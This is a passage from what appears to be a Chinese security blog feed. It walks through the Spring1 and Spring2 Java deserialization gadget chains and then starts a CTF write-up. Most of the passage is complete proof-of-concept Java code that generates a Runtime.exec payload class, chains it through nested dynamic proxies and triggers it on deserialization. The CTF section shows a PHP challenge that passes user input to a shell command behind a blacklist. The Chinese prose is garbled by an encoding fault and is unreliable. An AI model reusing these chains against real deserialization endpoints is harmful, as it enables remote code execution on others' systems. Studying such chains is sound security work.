class="hljs-string">&quot;Too many parameters for an annotation method&quot;</span>);<br><br>        <span class="hljs-keyword">switch</span>(member) &#123;<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;toString&quot;</span>:<br>                <span class="hljs-keyword">return</span> toStringImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;hashCode&quot;</span>:<br>                <span class="hljs-keyword">return</span> hashCodeImpl();<br>            <span class="hljs-keyword">case</span> <span class="hljs-string">&quot;annotationType&quot;</span>:<br>                <span class="hljs-keyword">return</span> type;<br>        &#125;<br><br>        <span class="hljs-comment">// Handle annotation member accessors</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> memberValues.get(member);<br><br>        <span class="hljs-keyword">if</span> (result == <span class="hljs-literal">null</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IncompleteAnnotationException</span>(type, member);<br><br>        <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> ExceptionProxy)<br>            <span class="hljs-keyword">throw</span> ((ExceptionProxy) result).generateException();<br><br>        <span class="hljs-keyword">if</span> (result.getClass().isArray() &amp;&amp; Array.getLength(result) != <span class="hljs-number">0</span>)<br>            result = cloneArray(result);<br><br>        <span class="hljs-keyword">return</span> result;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>invoke</code>çš„è¿”å›å€¼åœ¨<code>memberValues</code>ä¸­æ‰¾ï¼Œkeyä¸º<code>method</code>æ–¹æ³•åã€‚å¯ä»¥è¿”å›ä»»æ„å¯¹è±¡ã€‚</p><h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><p><code>TypeProvider#getType</code>è¿”å›çš„æ˜¯<code>Type</code>æ¥å£ç±»ï¼Œæˆ‘ä»¬å¯ä»¥è®©ä¸€ä¸ªåŠ¨æ€ä»£ç†ç±»å»ä»£ç†<code>Type</code>æ¥å£ã€‚</p><p>ç”±äºæ¥ä¸‹æ¥<code>ReflectionUtils.invokeMethod(method, this.provider.getType());</code>è¦è°ƒç”¨<code>newTransformer</code>ï¼Œå› æ­¤æˆ‘ä»¬è¿™ä¸ªä»£ç†ç±»é™¤äº†ä»£ç†<code>Type</code>æ¥å£ç±»ï¼Œè¿˜å¾—ä»£ç†<code>Templates</code>æ¥å£ç±»ï¼ˆæ‰èƒ½è·å–åˆ°æ¥å£ç±»çš„æ–¹æ³•ï¼‰</p><p>è·å–åˆ°çš„åŠ¨æ€ä»£ç†ç±»Proxy1æœ‰å¦‚ä¸‹æ–¹æ³•ï¼š</p><p><img src="/2024/08/12/Spring/image-20240812230157822.png" alt="image-20240812230157822"></p><p>é‚£å¦‚ä½•è®©<code>TypeProvider#getType</code>è¿”å›æˆ‘ä»¬çš„<code>(Type)Proxy1</code>å‘¢ï¼Œä¹Ÿæ˜¯å†å¥—ä¸€å±‚åŠ¨æ€ä»£ç†ï¼Œä»£ç†<code>TypeProvider</code>æ¥å£ç±»ï¼Œåˆ©ç”¨<code>AnnotationInvocationHandler</code>è¿”å›<code>Proxy1</code>ï¼Œå³è®¾ç½®<code>memberValues.put(&quot;getType&quot;, Proxy1)</code></p><p><code>Proxy1</code>çš„è°ƒç”¨å¤„ç†å™¨è®¾ç½®ä¸º<code>ObjectFactoryDelegatingInvocationHandler</code>ï¼Œè¿™æ ·å°±èƒ½æŠŠ<code>newTransformer</code>çš„è°ƒç”¨å§”æ‰˜ç»™<code>ObjectFactory#getObject</code>çš„è¿”å›å¯¹è±¡å»è°ƒç”¨äº†ã€‚</p><p>è®©<code>ObjectFactory#getObject</code>è¿”å›<code>TemplatesImpl</code>å³å¯ï¼Œåˆ°æ­¤æœ‰ä¸¤æ¡è·¯å¯èµ°ï¼Œç»§ç»­å¥—åŠ¨æ€ä»£ç†æˆ–å¯»æ‰¾<code>ObjectFactory</code>çš„å®ç°ç±»ï¼ˆç¿»äº†ä¸€ä¸‹å‘ç°ä¸å¥½æ„é€ ï¼Œè¿˜æ˜¯æ²¡æœ‰åŠ¨æ€ä»£ç†æ¥å¾—ä¼˜é›…ï¼‰</p><p>ç»§ç»­å¥—ä¸€å±‚åŠ¨æ€ä»£ç†ï¼Œä»£ç†<code>ObjectFactory&lt;?&gt;</code>æ³›å‹æ¥å£ï¼Œåˆ©ç”¨<code>AnnotationInvocationHandler</code>è¿”å›<code>TemplatesImpl</code>ï¼Œå³è®¾ç½®<code>memberValues.put(&quot;getObject&quot;, TemplatesImpl)</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.beans.factory.ObjectFactory;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        Class&lt;?&gt; clazz1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con1 = clazz1.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con1.setAccessible(<span class="hljs-literal">true</span>);<br>        HashMap&lt;String, Object&gt; map1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map1.put(<span class="hljs-string">&quot;getObject&quot;</span>, templates);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler1</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map1);<br>        ObjectFactory&lt;?&gt; factory = (ObjectFactory&lt;?&gt;) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;ObjectFactory.class&#125;, invocationHandler1);<br><br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;org.springframework.beans.factory.support.AutowireUtils$ObjectFactoryDelegatingInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">ofdHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(factory);<br>        <span class="hljs-type">Type</span> <span class="hljs-variable">typeTemplateProxy</span> <span class="hljs-operator">=</span> (Type) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, ofdHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, typeTemplateProxy);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con1.newInstance(Target.class, map2);<br><br>        Class&lt;?&gt; typeProviderClass = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;typeProviderClass&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;newTransformer&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="Spring2"><a href="#Spring2" class="headerlink" title="Spring2"></a>Spring2</h2><p>åœ¨Spring1é“¾åŸºç¡€ä¸Šæœ‰æ‰€å˜åŒ–ï¼ŒæŠŠ<code>spring-beans</code>çš„<code>ObjectFactoryDelegatingInvocationHandler</code>æ¢æˆ<code>spring-aop</code>çš„<code>JdkDynamicAopProxy</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-aop<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.1.4.RELEASE<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="JdkDynamicAopProxy"><a href="#JdkDynamicAopProxy" class="headerlink" title="JdkDynamicAopProxy"></a>JdkDynamicAopProxy</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JdkDynamicAopProxy</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">AopProxy</span>, InvocationHandler, Serializable &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> AdvisedSupport advised;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">JdkDynamicAopProxy</span><span class="hljs-params">(AdvisedSupport config)</span> <span class="hljs-keyword">throws</span> AopConfigException &#123;<br><span class="hljs-comment">// ...</span><br><span class="hljs-built_in">this</span>.advised = config;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2024/08/12/Spring/image-20240812230621109.png" alt="image-20240812230621109"></p><p><img src="/2024/08/12/Spring/image-20240812230629311.png" alt="image-20240812230629311"></p><p><code>JdkDynamicAopProxy</code>å°†æ–¹æ³•è°ƒç”¨å§”æ‰˜ç»™äº†<code>AdvisedSupport</code>çš„<code>target</code>æˆå‘˜</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.eddiemurphy;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Spring2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br><br>        <span class="hljs-type">AdvisedSupport</span> <span class="hljs-variable">as</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AdvisedSupport</span>();<br>        as.setTarget(templates);<br><br>        Class&lt;?&gt; clazz0 = Class.forName(<span class="hljs-string">&quot;org.springframework.aop.framework.JdkDynamicAopProxy&quot;</span>);<br>        Constructor&lt;?&gt; con0 = clazz0.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con0.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">aopInvocationHandler</span> <span class="hljs-operator">=</span> (InvocationHandler) con0.newInstance(as);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">aopProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Type.class, Templates.class&#125;, aopInvocationHandler);<br><br>        HashMap&lt;String, Object&gt; map2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<br>        map2.put(<span class="hljs-string">&quot;getType&quot;</span>, aopProxy);<br>        Class&lt;?&gt; clazz2 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; con2 = clazz2.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con2.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">invocationHandler2</span> <span class="hljs-operator">=</span> (InvocationHandler) con2.newInstance(Target.class, map2);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">typeProviderProxy</span> <span class="hljs-operator">=</span> Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$TypeProvider&quot;</span>)&#125;, invocationHandler2);<br><br>        Class&lt;?&gt; clazz3 = Class.forName(<span class="hljs-string">&quot;org.springframework.core.SerializableTypeWrapper$MethodInvokeTypeProvider&quot;</span>);<br>        Constructor&lt;?&gt; con3 = clazz3.getDeclaredConstructors()[<span class="hljs-number">0</span>];<br>        con3.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> con3.newInstance(typeProviderProxy, Object.class.getMethod(<span class="hljs-string">&quot;toString&quot;</span>), <span class="hljs-number">0</span>);<br>        setValue(o, <span class="hljs-string">&quot;methodName&quot;</span>, <span class="hljs-string">&quot;getOutputProperties&quot;</span>);<br><br>        ser(o);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">ser</span><span class="hljs-params">(Object o)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(o);<br>        oos.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray()));<br>        ois.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span> + cmd + <span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>ä»¥ä¸ŠPOCä¾èµ–ç‰ˆæœ¬ï¼š</p><p>Â· spring-beans : 4.1.4.RELEASE</p><p>Â· spring-core : 4.1.4.RELEASE</p><p>Â· spring-aop : 4.1.4.RELEASE</p><p>Â· jdk 1.7</p><hr><p>ä¸‹é›†é¢„å‘Šï¼šè¶…çº§é‡å¤´æˆï¼Œ<strong>Hessian</strong>.</p><hr><p>å‚è€ƒï¼š</p><p><a href="https://p4d0rn.gitbook.io/java/serial-journey/spring">Spring | Java (gitbook.io)</a></p><p><a href="https://su18.org/post/ysoserial-su18-3/#spring1">Java ååºåˆ—åŒ–æ¼æ´ï¼ˆä¸‰ï¼‰ - CB&#x2F;Groovy&#x2F;Hibernate&#x2F;Spring | ç´ åå…« (su18.org)</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>jqctf-final</title>
    <link href="/2024/08/11/jqctf-final/"/>
    <url>/2024/08/11/jqctf-final/</url>
    
    <content type="html"><![CDATA[<p>å­¦é•¿ä»¬æ‰“åˆ°ç¬¬ä¸€äº†ï¼Œtqlã€‚</p><p>ç”±äºå¾ˆå¤šç¯èŠ‚éƒ½æ²¡æœ‰ï¼Œè¿™é‡Œå°±åšä¸ªç®€å•çš„wpè®°å½•ã€‚</p><h1 id="ldvim"><a href="#ldvim" class="headerlink" title="ldvim"></a>ldvim</h1><p>ç­¾åˆ°é¢˜ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;filename&quot;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/(&#x27;|`|\n|\t|\\\$|~|@|#|;|&amp;|\\||\\=|\\*|\\%|\\\^|\\(|\\)|&#123;|\\[|\\\\|&gt;|&lt;)/is&quot;</span>, <span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;no&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$filename</span>))&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&quot;--help&quot;</span>;<br>&#125;<br><br><span class="hljs-comment">//view the file</span><br><span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;vim &quot;</span> . <span class="hljs-variable">$filename</span>);<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 